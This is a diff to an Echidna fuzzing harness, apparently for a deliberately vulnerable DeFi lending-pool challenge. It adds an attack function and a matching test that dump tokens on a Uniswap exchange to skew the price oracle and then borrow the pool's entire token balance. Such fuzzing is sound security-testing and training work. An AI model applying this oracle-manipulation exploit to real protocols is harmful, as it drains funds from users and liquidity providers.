@@ -28,28 +28,18 @@ contract Echidna {
 
     constructor() payable {
         _deployer = new Deployer();
-        (_token, _pool, _exchange) = _deployer.deploy{value: msg.value}();
-
         _initialPoolTokenBalance = _deployer.POOL_INITIAL_TOKEN_BALANCE();
 
-        _deployer.transfer(address(this), ATTACKER_TOKENS);
-    }
+        uint256 uniswapEth = _deployer.UNISWAP_INITIAL_ETH_RESERVE();
 
-    // //////////////
-    // EDUCATED GUESS
-    // //////////////
-
-    function attack() external {
-        uint256 tokensToBorrow = 90_000;
-        _pool.borrow{value: tokensToBorrow * 2}(tokensToBorrow, address(this));
-
-        _exchange.ethToTokenSwapInput{value: 1 ether}(
-            1,
-            block.timestamp + 1 hours
+        require(
+            address(this).balance == uniswapEth + ATTACKER_ETH,
+            "Invariants: incorrect ETH"
         );
 
-        _token.approve(address(_exchange), 1 ether);
-        _exchange.tokenToEthSwapInput(0.01 ether, 1, block.timestamp + 1 hours);
+        (_token, _pool, _exchange) = _deployer.deploy{value: uniswapEth}();
+
+        _deployer.transfer(address(this), ATTACKER_TOKENS);
 
         // _token.approve(address(_exchange), ATTACKER_TOKENS);
         // _exchange.tokenToEthSwapInput(
@@ -66,6 +56,30 @@ contract Echidna {
         //     1, // min token
         //     block.timestamp + 1 hours
         // );
+
+        // require(false, "Invariants: setup failed");
+    }
+
+    // //////////////
+    // EDUCATED GUESS
+    // //////////////
+
+    function attack() external {
+        _token.approve(address(_exchange), ATTACKER_TOKENS);
+        _exchange.tokenToEthSwapInput(
+            ATTACKER_TOKENS,
+            // @audit-info min-eth needs to be > 0
+            1, // min eth
+            block.timestamp + 1 hours
+        );
+        _pool.borrow{value: address(this).balance}(
+            _initialPoolTokenBalance,
+            address(this)
+        );
+        _exchange.ethToTokenSwapInput{value: address(this).balance}(
+            1, // min token
+            block.timestamp + 1 hours
+        );
     }
 
     // /////////////////
@@ -84,6 +98,26 @@ contract Echidna {
     // INVARIANT PROPERTIES
     // ////////////////////
 
+    // @audit-info if can't get educated guess to work, try implementing it in an invariant property, getting it to pass.
+    function ignore_echidna_test_attack_doesnt_revert() public returns (bool) {
+        _token.approve(address(_exchange), ATTACKER_TOKENS);
+        _exchange.tokenToEthSwapInput(
+            ATTACKER_TOKENS,
+            // @audit-info min-eth needs to be > 0
+            1, // min eth
+            block.timestamp + 1 hours
+        );
+        _pool.borrow{value: address(this).balance}(
+            _initialPoolTokenBalance,
+            address(this)
+        );
+        _exchange.ethToTokenSwapInput{value: address(this).balance}(
+            1, // min token
+            block.timestamp + 1 hours
+        );
+        return true;
+    }
+
     function echidna_cannot_empty_tokens_from_pool()
         public
         view
@@ -91,4 +125,7 @@ contract Echidna {
     {
         return _token.balanceOf(address(_pool)) > 0;
     }
+
+    // @audit-info if receive is missing, educated guess will fail
+    receive() external payable {}
 }
